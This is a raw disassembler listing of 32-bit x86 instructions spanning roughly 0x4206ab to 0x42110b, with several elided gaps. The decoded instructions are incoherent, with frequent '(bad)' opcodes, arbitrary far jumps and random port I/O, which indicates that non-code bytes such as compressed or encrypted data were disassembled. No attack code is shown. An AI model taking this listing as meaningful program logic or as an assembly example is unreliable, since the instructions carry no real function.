  4206ab:	add    ah,BYTE PTR ss:[ecx-0x326a9902]
  4206b2:	aaa    
  4206b3:	call   0x3fe3:0x8e524775
  4206ba:	cs out 0x27,al
  4206bd:	mov    esp,0x7b6acf1
  4206c2:	aas    
  4206c3:	xor    BYTE PTR [esi],bl
  4206c5:	xor    BYTE PTR [esi+0x1455703a],bh
  4206cb:	cmp    eax,0x6eb9b63e
  4206d0:	ds sbb cl,dh
  4206d3:	pop    es
  4206d4:	sbb    BYTE PTR [edx+0x24],cl
  4206d7:	cs scas al,BYTE PTR es:[edi]
  4206d9:	mov    ch,0x8c
  4206db:	je     0x4206fe
  4206dd:	inc    eax
  4206de:	test   BYTE PTR [edi+0x57517fc5],dl
  4206e4:	mov    edi,0x6abce092
  4206e9:	ins    BYTE PTR es:[edi],dx
  4206ea:	not    DWORD PTR ss:[ecx-0xa]
  4206ee:	jno    0x4206c6
  4206f0:	daa    
  4206f1:	cmp    BYTE PTR [ecx-0x724ee08b],ah
  4206f7:	imul   esp,edi,0xa40d5e2e
  4206fd:	aad    0xc4
  4206ff:	adc    DWORD PTR ds:0x66bf5fc4,edx
  420705:	jbe    0x4206f1
  420707:	inc    esi
  420708:	jl     0x420717
  42070a:	xor    DWORD PTR [edi+0x41ffe539],edx
  420710:	xor    DWORD PTR [ebx],esi
  420712:	mov    al,0x24
  420714:	push   esp
  420715:	aaa    
  420716:	dec    eax
  420717:	adc    ah,dh
  420719:	ins    DWORD PTR es:[edi],dx
  42071a:	pop    esp
  42071b:	or     al,0x30
  42071d:	ret    0x76e4
  420720:	ret    0x28da
  420723:	jo     0x420771
  420725:	or     bh,0xcc
  420728:	stc    
  420729:	pop    es
  42072a:	pop    esi
  42072b:	and    BYTE PTR [esi+edx*4+0x38],al
  42072f:	mov    eax,0xad856147
  420734:	mov    edx,0x651366b
  420739:	add    bl,bh
  42073b:	fs ss dec ecx
  42073e:	adc    BYTE PTR [edx],dl
  420740:	inc    ecx
  420741:	int3   
  420742:	icebp  
  420743:	in     eax,0x9a
  420745:	enter  0x8459,0xd2
  420749:	stos   DWORD PTR es:[edi],eax
  42074a:	fbld   TBYTE PTR ds:0x5d9f3584
  420750:	test   al,0x17
  420752:	adc    esp,ebp
  420754:	nop
  420755:	scas   al,BYTE PTR es:[edi]
  420756:	idiv   BYTE PTR ds:0x3989dc0
  42075c:	loopne 0x4206ef
  42075e:	fiadd  DWORD PTR [edx-0x60]
  420761:	inc    ebp
  420762:	ins    DWORD PTR es:[edi],dx
  420763:	jl     0x4207b7
  420765:	or     eax,0xbdaab0fc
  42076a:	lahf   
  42076b:	pop    ebp
  42076c:	mov    cl,0x23
  42076e:	mov    esp,0x25242dd6
  420773:	mov    ?,WORD PTR [edi]
  420775:	push   edx
  420776:	cmp    bl,BYTE PTR [edi+0x50]
  420779:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42077b:	jb     0x4207f6
  42077d:	enter  0x2118,0x9b
  420781:	add    al,BYTE PTR [edi]
  420783:	in     al,dx
  420784:	cwde   
  420785:	xor    bh,ch
  420787:	sbb    al,0x58
  420789:	fist   DWORD PTR [esi]
  42078b:	pop    edi
  42078c:	mov    es,WORD PTR [edx+eax*2]
  42078f:	retf   
  420790:	lea    eax,[eax]
	...
  4207f2:	add    BYTE PTR [eax],al
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	outs   dx,BYTE PTR ds:[esi]
  420801:	ficomp DWORD PTR [eax+0x15a7af0]
  420807:	add    BYTE PTR ds:0xa9000001,al
  42080d:	scas   eax,DWORD PTR es:[edi]
  42080e:	mov    eax,ds:0x5ae925e0
  420813:	aaa    
  420814:	fwait
  420815:	idiv   DWORD PTR [esp+esi*1-0x5b6ff6f]
  42081c:	jns    0x4207c7
  42081e:	push   es
  42081f:	lods   eax,DWORD PTR ds:[esi]
  420820:	or     eax,0x916909bd
  420825:	out    dx,eax
  420826:	mov    edx,edi
  420828:	xor    ecx,eax
  42082a:	sub    ebp,DWORD PTR [esi]
  42082c:	jnp    0x420866
  42082e:	fcomp  st(2)
  420830:	data16 lahf 
  420832:	jbe    0x42088d
  420834:	cmp    bl,BYTE PTR [edx+0x70821e5f]
  42083a:	mov    edi,DWORD PTR [ecx+0x4927cc60]
  420840:	mov    eax,0x4f30238e
  420845:	cmp    dl,dh
  420847:	inc    edx
  420848:	push   ecx
  420849:	push   cs
  42084a:	xchg   BYTE PTR [esi],bh
  42084c:	mov    edx,0x579eed21
  420851:	pop    edx
  420852:	add    dl,dl
  420854:	adc    DWORD PTR [ebp-0x40471aa8],ebx
  42085a:	bound  edx,QWORD PTR [ebx]
  42085c:	add    DWORD PTR [esi],eax
  42085e:	cmp    DWORD PTR [ebp+0x2e],edx
  420861:	jb     0x4208dd
  420863:	imul   eax,ecx,0x8c804e89
  420869:	adc    ah,BYTE PTR [edx-0x69755ab1]
  42086f:	cmp    BYTE PTR [ebp+0x3f40d886],bh
  420875:	bound  eax,QWORD PTR [ebp+0x14]
  420878:	dec    esi
  420879:	mov    bh,BYTE PTR [eax-0x1909aa03]
  42087f:	xchg   ebx,eax
  420880:	jno    0x420875
  420882:	icebp  
  420883:	push   es
  420884:	retf   0x6050
  420887:	xor    dh,BYTE PTR [esp+edi*8+0x7d576fc5]
  42088e:	mov    ds:0x3af01593,eax
  420893:	fwait
  420894:	icebp  
  420895:	call   0xf0e5446c
  42089a:	jbe    0x420828
  42089c:	pop    es
  42089d:	pop    edx
  42089e:	ins    BYTE PTR es:[edi],dx
  42089f:	aas    
  4208a0:	xchg   esi,eax
  4208a1:	(bad)  [ecx]
  4208a3:	repnz shl DWORD PTR [ebp+eiz*8+0x391c67a7],cl
  4208ab:	push   esp
  4208ac:	and    bl,BYTE PTR [edx+ebx*2-0x43135ae1]
  4208b3:	pop    ebp
  4208b4:	dec    edi
  4208b5:	aad    0x2d
  4208b7:	scas   al,BYTE PTR es:[edi]
  4208b8:	sbb    al,BYTE PTR [edi+esi*4-0x3a]
  4208bc:	push   0x34
  4208be:	lock pop ebx
  4208c0:	dec    edx
  4208c1:	in     eax,0x2f
  4208c3:	jo     0x4208ea
  4208c5:	pop    esi
  4208c6:	scas   eax,DWORD PTR es:[edi]
  4208c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208c8:	not    BYTE PTR [ebp+eax*1+0x17]
  4208cc:	rcl    esi,0xde
  4208cf:	out    dx,al
  4208d0:	imul   ecx,DWORD PTR [esi+0xe],0x5d
  4208d4:	in     eax,0x79
  4208d6:	popa   
  4208d7:	repnz fcmove st,st(2)
  4208da:	adc    ebx,edi
  4208dc:	ret    0x894d
  4208df:	leave  
  4208e0:	xor    BYTE PTR [eax],cl
  4208e2:	addr16 mov ds:0x953e,eax
  4208e6:	mov    dh,0x48
  4208e8:	mov    dh,0xb0
  4208ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208eb:	out    0x56,al
  4208ed:	inc    edx
  4208ee:	pushf  
  4208ef:	cmc    
  4208f0:	nop
  4208f1:	out    0x89,al
  4208f3:	mov    ds:0xa76e04d7,al
  4208f8:	fnstenv [ecx]
  4208fa:	mov    dh,0x66
  4208fc:	stc    
  4208fd:	je     0x42092b
  4208ff:	sbb    eax,0x411b9996
  420904:	cmp    esp,DWORD PTR gs:[edx+0x5c]
  420908:	sti    
  420909:	push   ds
  42090a:	pop    es
  42090b:	mov    es:0xf985305,al
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xc0
  420981:	sahf   
  420982:	mov    al,0x63
  420984:	jg     0x4209e1
  420986:	add    DWORD PTR [eax],eax
  420988:	add    eax,0x9000001
  42098d:	ins    BYTE PTR es:[edi],dx
  42098e:	inc    ebp
  42098f:	mov    ds:0xb00db742,al
  420994:	sub    al,0xc6
  420996:	sub    eax,0xecc39ab1
  42099b:	mov    cl,0xa4
  42099d:	test   eax,0xd54197a7
  4209a2:	xchg   esp,eax
  4209a3:	jg     0x420a03
  4209a5:	sub    ebp,ebx
  4209a7:	shl    BYTE PTR [ebx-0x37],0xb9
  4209ab:	in     al,0xc2
  4209ad:	sub    ecx,DWORD PTR [esi]
  4209af:	and    eax,0x8e0aaf8a
  4209b4:	push   ecx
  4209b5:	xor    al,BYTE PTR [ecx-0x25bec82e]
  4209bb:	jo     0x4209ec
  4209bd:	xor    eax,esi
  4209bf:	(bad)  
  4209c0:	(bad)  
  4209c1:	popf   
  4209c2:	out    dx,al
  4209c3:	xlat   BYTE PTR ds:[ebx]
  4209c4:	pop    eax
  4209c5:	test   al,0xa1
  4209c7:	jne    0x420967
  4209c9:	sbb    DWORD PTR [edx+0x21],ebp
  4209cc:	sub    eax,0xf65e8225
  4209d1:	sub    cl,al
  4209d3:	test   DWORD PTR [ebp+edx*4-0x55],esp
  4209d7:	gs sub eax,0x8c52b581
  4209dd:	fs mov bh,0x99
  4209e0:	xchg   esi,eax
  4209e1:	or     ch,bh
  4209e3:	push   edi
  4209e4:	or     eax,0x96aae750
  4209e9:	gs scas eax,DWORD PTR es:[edi]
  4209eb:	mov    ds:0x8adb4d7b,eax
  4209f0:	popf   
  4209f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209f2:	cmp    bh,BYTE PTR [eax-0x5d]
  4209f5:	add    BYTE PTR [eax+edx*8],bh
  4209f8:	jecxz  0x420a4e
  4209fa:	aad    0x64
  4209fc:	push   cs
  4209fd:	lea    eax,[edi+ebx*8-0x60350ed8]
  420a04:	pop    ss
  420a05:	fsub   st(7),st
  420a07:	jle    0x420a32
  420a09:	ds mov bl,0xce
  420a0c:	dec    ebp
  420a0d:	div    bl
  420a0f:	cdq    
  420a10:	inc    edx
  420a11:	dec    esi
  420a12:	jmp    0x420a19
  420a14:	mov    ds:0x1c2184c7,al
  420a19:	int    0xc7
  420a1b:	mov    ah,bl
  420a1d:	lods   al,BYTE PTR ds:[esi]
  420a1e:	test   eax,0xe3f4f890
  420a23:	mov    ebp,0x322525d5
  420a28:	(bad)  
  420a29:	retf   
  420a2a:	mov    edx,0xccc9f03c
  420a2f:	inc    esp
  420a30:	jo     0x4209f0
  420a32:	int3   
  420a33:	fld    TBYTE PTR [eax]
  420a35:	in     al,0x24
  420a37:	cmp    bh,cl
  420a39:	dec    ecx
  420a3a:	ja     0x420a02
  420a3c:	fmul   st(6),st
  420a3e:	push   cs
  420a3f:	inc    ebp
  420a40:	imul   edi,DWORD PTR [ebx+0x77],0x30
  420a44:	mov    eax,ds:0xacfc8bda
  420a49:	push   es
  420a4a:	mov    dh,0x44
  420a4c:	int    0x76
  420a4e:	imul   esi,DWORD PTR [ecx],0xda40ac52
  420a54:	enter  0x8a29,0x8a
  420a58:	jg     0x420ad8
  420a5a:	mov    esi,ebp
  420a5c:	(bad)  
  420a5d:	daa    
  420a5e:	mov    BYTE PTR [eax-0x10],0x74
  420a62:	and    al,BYTE PTR [eax+ebp*1+0x3b]
  420a66:	jbe    0x420ad1
  420a68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a69:	rcl    BYTE PTR [eax+0x7c],cl
  420a6c:	inc    edx
  420a6d:	(bad)  
  420a6f:	xchg   BYTE PTR [edi-0x557d6863],dl
  420a75:	loope  0x420adf
  420a77:	xor    dh,cl
  420a79:	jno    0x4209fd
  420a7b:	dec    eax
  420a7c:	(bad)  
  420a7d:	jle    0x420a39
  420a7f:	cmp    DWORD PTR [esi+0x38c4d7d9],ecx
  420a85:	cdq    
  420a86:	fs jae 0x420a70
  420a89:	rcl    DWORD PTR ds:0xa47378d0,cl
  420a8f:	fsub   QWORD PTR [eax+eax*1+0x0]
	...
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	lahf   
  420b01:	push   0x5c84307a
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    eax,0x7d000001
  420b0d:	in     al,dx
  420b0e:	cwde   
  420b0f:	mov    ebp,0xa75ebbbf
  420b14:	jg     0x420b1b
  420b16:	sub    eax,0x48fd88c
  420b1b:	rcl    BYTE PTR [esi],0xa9
  420b1e:	xchg   esp,eax
  420b1f:	scas   eax,DWORD PTR es:[edi]
  420b20:	loopne 0x420b92
  420b22:	je     0x420b53
  420b24:	mov    ecx,0x1a57630
  420b29:	mov    ch,dh
  420b2b:	adc    ax,0x6adc
  420b2f:	or     eax,0x6c05b10e
  420b34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b35:	push   eax
  420b36:	xchg   ecx,eax
  420b37:	cdq    
  420b38:	aad    0x47
  420b3a:	pop    ecx
  420b3b:	in     al,dx
  420b3c:	in     al,0x92
  420b3e:	clc    
  420b3f:	mov    ch,0x67
  420b41:	jge    0x4f1a2fcb
  420b47:	imul   edi,DWORD PTR [esi-0x3503668d],0xb1ee353b
  420b51:	test   al,0x78
  420b53:	addr16 dec edx
  420b55:	mov    bh,0x92
  420b57:	push   edx
  420b58:	jecxz  0x420b3c
  420b5a:	push   0x55
  420b5c:	jmp    0xb77b:0xc6ed0623
  420b63:	cmp    ch,BYTE PTR [edx-0x4e456e11]
  420b69:	sub    eax,0xcbca914d
  420b6e:	bound  ecx,QWORD PTR [esi-0x54]
  420b71:	loop   0x420bc8
  420b73:	sub    BYTE PTR [eax-0x6ebc3489],cl
  420b79:	mov    ch,0x4a
  420b7b:	xchg   ebx,eax
  420b7c:	pop    ebp
  420b7d:	jecxz  0x420bfe
  420b7f:	push   0x9778489a
  420b84:	stos   BYTE PTR es:[edi],al
  420b85:	xchg   edi,eax
  420b86:	or     cl,dl
  420b88:	scas   al,BYTE PTR es:[edi]
  420b89:	cmp    al,0x19
  420b8b:	and    bh,BYTE PTR [eiz*4-0x11b5a7e4]
  420b92:	dec    eax
  420b93:	mov    ecx,0x965599df
  420b98:	mov    edx,0xac55a259
  420b9d:	xor    DWORD PTR [esi+0x23b26dd3],edi
  420ba3:	adc    al,0x59
  420ba5:	mov    dh,0x50
  420ba7:	sub    ebp,DWORD PTR [edi]
  420ba9:	ret    0x2db8
  420bac:	mov    edx,DWORD PTR [eax-0x7bb59a64]
  420bb2:	cld    
  420bb3:	and    eax,0x64bde900
  420bb8:	cmp    BYTE PTR [ebp+0x2cf382cb],0x87
  420bbf:	xchg   esi,eax
  420bc0:	or     BYTE PTR [ebx+0x42],ch
  420bc3:	call   DWORD PTR [esi+ebp*4+0x14]
  420bc7:	cmc    
  420bc8:	sbb    ebp,ebp
  420bca:	mov    es,WORD PTR [eax+0x53]
  420bcd:	mov    BYTE PTR [ebx+0x40febebf],dl
  420bd3:	popa   
  420bd4:	fdivr  DWORD PTR [ebx+0x23999a2b]
  420bda:	imul   ebp,DWORD PTR [esi-0x1cb721e2],0x46
  420be1:	push   es
  420be2:	loopne 0x420c20
  420be4:	adc    ebp,DWORD PTR [eax]
  420be6:	aas    
  420be7:	push   ds
  420be8:	xchg   ebx,eax
  420be9:	add    al,0x47
  420beb:	mov    esp,0xb1e539bc
  420bf0:	stos   BYTE PTR es:[edi],al
  420bf1:	xchg   DWORD PTR [eax+0x625a43e4],ebp
  420bf7:	push   0xbb3045a8
  420bfc:	pusha  
  420bfd:	and    DWORD PTR [edi-0x24],edx
  420c00:	xor    eax,0x92861966
  420c05:	fdivr  DWORD PTR [ebx-0x25]
  420c08:	jg     0x420c65
  420c0a:	shl    esp,0xe6
  420c0d:	dec    ebp
  420c0e:	lods   al,BYTE PTR ds:[esi]
  420c0f:	xchg   BYTE PTR [edx+0x0],bh
	...
  420c72:	add    BYTE PTR [eax],al
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0xa3
  420c81:	call   FWORD PTR [ebx]
  420c83:	jmp    0x105:0x15d89
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	(bad)  
  420c8d:	pop    edx
  420c8e:	jle    0x420c98
  420c90:	push   ds
  420c91:	mov    eax,ebx
  420c93:	xor    al,0x7b
  420c95:	cmp    BYTE PTR [edi+0x6d506e3a],dh
  420c9b:	cmc    
  420c9c:	and    BYTE PTR [ebp+0x68],bl
  420c9f:	iret   
  420ca0:	dec    ebp
  420ca1:	jp     0x420cad
  420ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ca4:	aas    
  420ca5:	imul   edx,DWORD PTR [esi],0x7d
  420ca8:	in     eax,dx
  420ca9:	out    0xb,eax
  420cab:	mov    dl,0x37
  420cad:	(bad)  
  420cae:	shl    BYTE PTR [ebx],0xfa
  420cb1:	stc    
  420cb2:	dec    edx
  420cb3:	mov    ebp,0x75dd6283
  420cb8:	sub    ebp,DWORD PTR [eax+eiz*8+0x64]
  420cbc:	lock popf 
  420cbe:	ds scas eax,DWORD PTR es:[edi]
  420cc0:	jbe    0x420c92
  420cc2:	jecxz  0x420cd3
  420cc4:	inc    ebx
  420cc5:	push   edx
  420cc6:	clc    
  420cc7:	mov    DWORD PTR [eax],ecx
  420cc9:	mov    esi,0xcab88ba4
  420cce:	inc    ebp
  420ccf:	lock in eax,dx
  420cd1:	out    0xe3,eax
  420cd3:	clc    
  420cd4:	jg     0x420d40
  420cd6:	repnz es sub eax,0x76e28830
  420cdd:	call   0xed2821ed
  420ce2:	ror    BYTE PTR [ebx],1
  420ce4:	fsubr  QWORD PTR [ebx]
  420ce6:	not    DWORD PTR [edi-0x7d]
  420ce9:	mov    eax,0x2105ddd9
  420cee:	adc    dh,BYTE PTR [eax-0x2b0f18c7]
  420cf4:	or     ah,ah
  420cf6:	mov    DWORD PTR [ebx-0x18],esp
  420cf9:	xor    esp,esp
  420cfb:	pop    eax
  420cfc:	mov    edx,0xac9ad3a3
  420d01:	clc    
  420d02:	mov    ds:0x32c6d562,eax
  420d07:	xor    eax,DWORD PTR [esi]
  420d09:	imul   ebx,DWORD PTR [esi-0x7c],0xc706407
  420d10:	scas   eax,DWORD PTR es:[edi]
  420d11:	imul   ebp,DWORD PTR [ebp-0x2366ae07],0xffffffe4
  420d18:	jne    0x420d65
  420d1a:	push   edx
  420d1b:	out    0x23,eax
  420d1d:	xchg   esi,eax
  420d1e:	and    esi,ecx
  420d20:	adc    DWORD PTR [edx],esi
  420d22:	jmp    0x411e4275
  420d27:	xchg   edx,eax
  420d28:	mov    ds:0x20118d79,al
  420d2d:	inc    edi
  420d2e:	sub    eax,0x6858af5a
  420d33:	not    ebp
  420d35:	shl    DWORD PTR [ecx],0x23
  420d38:	sahf   
  420d39:	sahf   
  420d3a:	lods   eax,DWORD PTR ds:[esi]
  420d3b:	and    ecx,DWORD PTR [ebx]
  420d3d:	mov    al,0xdb
  420d3f:	sbb    al,0xdd
  420d41:	and    DWORD PTR [edx],esp
  420d43:	mov    bh,0xed
  420d45:	xor    BYTE PTR [esi+0x50],dh
  420d48:	fild   WORD PTR [esi+ecx*4+0xd]
  420d4c:	or     ch,ch
  420d4e:	cli    
  420d4f:	test   al,0x3d
  420d51:	jae    0x420dc0
  420d53:	ss push esi
  420d55:	adc    al,0x12
  420d57:	mov    cl,0x56
  420d59:	xor    bh,ah
  420d5b:	call   0x94ec:0x34f127d4
  420d62:	mov    DWORD PTR [ebp+0x35],edi
  420d65:	rol    bh,1
  420d67:	xchg   esi,eax
  420d68:	or     ah,BYTE PTR [eax-0x13]
  420d6b:	cs popa 
  420d6d:	push   ebx
  420d6e:	jl     0x420d6e
  420d70:	rcl    DWORD PTR [edx],cl
  420d72:	lock mov dl,BYTE PTR [edx-0x5db0954a]
  420d79:	and    bh,BYTE PTR [ebp-0xd3beb25]
  420d7f:	dec    esi
  420d80:	ss xchg ecx,eax
  420d82:	xor    ebx,DWORD PTR [esi-0x3e80d8c6]
  420d88:	pop    ss
  420d89:	mov    ebp,gs
  420d8b:	fldenv [edi-0x73]
  420d8e:	add    esp,ecx
  420d90:	jmp    0x420d92
	...
  420df2:	add    BYTE PTR [eax],al
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x2c9e0d3d
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0xa6000001,al
  420e0d:	jp     0x420e67
  420e0f:	mov    eax,0x97bb6813
  420e14:	dec    ecx
  420e15:	mov    ds:0xbcd0d215,al
  420e1a:	adc    esi,edx
  420e1c:	in     eax,dx
  420e1d:	mov    fs,WORD PTR [eax]
  420e1f:	ds int 0x21
  420e22:	int3   
  420e23:	jmp    FWORD PTR [ecx-0x39]
  420e26:	add    al,0xb5
  420e28:	fs jne 0x420e1b
  420e2b:	jmp    0xfe68564f
  420e30:	lds    esi,FWORD PTR [ebx]
  420e32:	(bad)  
  420e33:	scas   eax,DWORD PTR es:[edi]
  420e34:	stos   DWORD PTR es:[edi],eax
  420e35:	push   edi
  420e36:	add    al,0xc8
  420e38:	pop    esp
  420e39:	repz adc bl,BYTE PTR [edi-0x150e8ce1]
  420e40:	test   al,0x30
  420e42:	mov    esp,0xc6a8c160
  420e47:	jmp    0xa321636a
  420e4c:	mov    dh,0x42
  420e4e:	int    0xce
  420e50:	cmp    DWORD PTR [edi+0x4754811f],esp
  420e56:	and    eax,0xf3689d3b
  420e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e5c:	shr    BYTE PTR es:[ebx],cl
  420e5f:	xor    eax,0x650cfeb7
  420e64:	mov    ch,0xa3
  420e66:	icebp  
  420e67:	dec    ecx
  420e68:	mov    eax,0x9ddfdb1e
  420e6d:	imul   esi,DWORD PTR [edi],0x1f
  420e70:	sbb    ecx,DWORD PTR [eax-0x47]
  420e73:	lods   al,BYTE PTR ds:[esi]
  420e74:	hlt    
  420e75:	cli    
  420e76:	ficomp DWORD PTR [esp+ecx*1+0x7e2a1eb0]
  420e7d:	mov    ah,0x56
  420e7f:	pop    ebx
  420e80:	and    eax,0x5133e535
  420e85:	inc    ecx
  420e86:	retf   
  420e87:	push   ebx
  420e88:	fnstenv [esi]
  420e8a:	cs mov fs:0x716ec28f,eax
  420e91:	sbb    ecx,esi
  420e93:	pop    ebp
  420e94:	push   ebx
  420e95:	imul   BYTE PTR [ecx-0x3d3b2d50]
  420e9b:	lahf   
  420e9c:	je     0x420e7a
  420e9e:	mov    WORD PTR [ebx],ds
  420ea0:	or     edi,ebx
  420ea2:	mov    edx,0x1673b5c1
  420ea7:	mov    edi,edi
  420ea9:	scas   eax,DWORD PTR es:[edi]
  420eaa:	sbb    al,0x3b
  420eac:	mov    WORD PTR [ebx+0x29],?
  420eaf:	(bad)  
  420eb0:	sbb    ebp,DWORD PTR [edi+edi*2]
  420eb3:	jg     0x420eda
  420eb5:	push   ds
  420eb6:	aam    0xad
  420eb8:	ficom  WORD PTR [esi-0x25579c26]
  420ebe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ebf:	mov    eax,0x7d60cf43
  420ec4:	fiadd  DWORD PTR [edx]
  420ec6:	sbb    eax,0x23eaa5e0
  420ecb:	add    dh,dh
  420ecd:	fwait
  420ece:	mul    BYTE PTR ds:0x89d89179
  420ed4:	jno    0x420f11
  420ed6:	scas   al,BYTE PTR es:[edi]
  420ed7:	sbb    esp,DWORD PTR [edx]
  420ed9:	inc    ebx
  420eda:	pop    es
  420edb:	and    BYTE PTR cs:[eax],bh
  420ede:	push   eax
  420edf:	dec    esi
  420ee0:	mov    eax,ds:0x91da1339
  420ee5:	jno    0x420ecf
  420ee7:	arpl   bp,ax
  420ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420eeb:	ror    eax,0xa9
  420eee:	mov    cl,0x2d
  420ef0:	xchg   esp,eax
  420ef1:	xchg   esi,eax
  420ef2:	add    eax,0xee691ea9
  420ef7:	stos   BYTE PTR es:[edi],al
  420ef8:	(bad)  
  420efa:	mov    ebx,0x993453e0
  420eff:	sub    eax,0xa5223e4a
  420f04:	cld    
  420f05:	push   esp
  420f06:	or     eax,0x43fc782c
  420f0b:	add    ah,al
  420f0d:	lock xchg edi,eax
  420f0f:	jae    0x420f15
	...
  420f71:	add    BYTE PTR [eax],al
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x350827a5]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0x7d000001
  420f8d:	enter  0x5dbf,0x39
  420f91:	dec    edx
  420f92:	cmp    al,al
  420f94:	ret    
  420f95:	jbe    0x420f23
  420f97:	loop   0x420f99
  420f99:	adc    DWORD PTR [ebx+0x4],ecx
  420f9c:	or     DWORD PTR [edi-0x34],0x29
  420fa0:	pop    esp
  420fa1:	xor    DWORD PTR [eax+0xa284c51],edi
  420fa7:	inc    esi
  420fa8:	and    eax,0xdbba5270
  420fad:	mov    DWORD PTR [eax+0x2e],ebp
  420fb0:	seta   dl
  420fb3:	xor    eax,0x57c1b07c
  420fb8:	sbb    al,0x44
  420fba:	div    cl
  420fbc:	push   esp
  420fbd:	icebp  
  420fbe:	push   cs
  420fbf:	dec    ebx
  420fc0:	adc    esp,edi
  420fc2:	cmp    DWORD PTR [eax+0x47],ecx
  420fc5:	push   0x954c6b7d
  420fca:	jbe    0x421008
  420fcc:	inc    eax
  420fcd:	push   edx
  420fce:	div    DWORD PTR [esi+0x3fba49cf]
  420fd4:	mov    esp,0x6e216fbc
  420fd9:	rcr    bh,cl
  420fdb:	(bad)  
  420fdc:	enter  0xd502,0x83
  420fe0:	lock inc esp
  420fe2:	mov    ebp,DWORD PTR [ebp-0x11]
  420fe5:	xor    ah,al
  420fe7:	enter  0xed9d,0x4
  420feb:	loope  0x420f8e
  420fed:	adc    ebx,DWORD PTR [edx]
  420fef:	ret    
  420ff0:	push   ds
  420ff1:	sahf   
  420ff2:	jp     0x420fb6
  420ff4:	popa   
  420ff5:	mov    al,0x54
  420ff7:	push   esi
  420ff8:	jo     0x420f7c
  420ffa:	ret    0x77fc
  420ffd:	add    DWORD PTR [eax+0x303dd505],ecx
  421003:	add    al,0x5a
  421005:	push   ecx
  421006:	xlat   BYTE PTR ds:[ebx]
  421007:	inc    ebx
  421008:	or     ecx,edx
  42100a:	dec    esi
  42100b:	inc    esp
  42100c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42100d:	test   DWORD PTR [edi-0x6e],edi
  421010:	jecxz  0x421023
  421012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421013:	cmp    eax,0x8f0954f4
  421018:	pop    ebx
  421019:	das    
  42101a:	test   al,0x70
  42101c:	loop   0x420fa3
  42101e:	inc    esp
  42101f:	xlat   BYTE PTR ds:[ebx]
  421020:	imul   ebx,DWORD PTR ss:[eax],0x42
  421024:	cmp    DWORD PTR ds:0x8e985d8c,edx
  42102a:	pop    esi
  42102b:	pop    es
  42102c:	and    BYTE PTR ds:0x7b63cf55,al
  421032:	idiv   esp
  421034:	mov    bh,0x31
  421036:	(bad)  
  421037:	fsubr  st,st(6)
  421039:	jp     0x42101d
  42103b:	cvtps2pd xmm3,QWORD PTR [ecx+ebx*8]
  42103f:	sub    eax,0x3112be4a
  421044:	mov    WORD PTR [eax],?
  421046:	rcr    esp,1
  421048:	cwde   
  421049:	cmp    BYTE PTR [ecx+0x6941c0d8],ch
  42104f:	test   al,0xc
  421051:	sub    eax,DWORD PTR [ecx-0x7b]
  421054:	jns    0x42105e
  421056:	jmp    0xd48497b5
  42105b:	int    0xb8
  42105d:	sub    edx,eax
  42105f:	mov    bh,BYTE PTR [ecx-0x6df1adc6]
  421065:	xor    DWORD PTR [ebx-0x3c42d254],ecx
  42106b:	fidivr WORD PTR [ebp+0x49]
  42106e:	xchg   edx,eax
  42106f:	add    eax,0x1e5abcdb
  421074:	jo     0x4210f2
  421076:	std    
  421077:	mov    bh,dl
  421079:	scas   eax,DWORD PTR es:[edi]
  42107a:	shl    BYTE PTR [eax-0x45],0x58
  42107e:	mov    cl,0x6
  421080:	and    BYTE PTR [edi],ah
  421082:	and    ah,BYTE PTR [eax+0x2b]
  421085:	test   dh,0x42
  421088:	xchg   esi,eax
  421089:	rcr    DWORD PTR [ecx],1
  42108b:	cdq    
  42108c:	aaa    
  42108d:	gs mov al,0x7
  421090:	jb     0x421092
	...
  4210f2:	add    BYTE PTR [eax],al
  4210f4:	lahf   
  4210f5:	pop    esi
  4210f6:	fcmovb st,st(6)
  4210f8:	fcmovnb st,st(6)
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    cs,WORD PTR [esi]
  421101:	xchg   ebx,eax
  421102:	cdq    
  421103:	sbb    DWORD PTR [eax+0x5000160],ebx
  421109:	add    DWORD PTR [eax],eax
  42110b:	add    BYTE PTR [ebx+0xa],dl
